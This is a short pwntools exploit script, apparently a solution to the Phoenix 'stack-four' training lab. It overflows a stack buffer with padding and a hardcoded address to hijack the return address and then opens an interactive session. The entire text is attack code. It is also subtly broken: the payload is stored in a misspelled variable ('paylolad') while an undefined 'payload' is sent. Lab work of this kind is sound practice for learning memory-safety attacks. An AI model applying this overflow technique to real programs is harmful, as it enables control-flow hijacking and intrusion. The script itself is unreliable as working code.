from pwn import *

p = process('/opt/phoenix/i486/stack-four')

complete_level = "\xe5\x84\x04\x08"
paylolad = ("A" * 76 + "B" * 4 + complete_level) # Need to get out of the first return, so needed to add 4 extra bytes to the buffer

p.sendline(payload)

p.interactive()
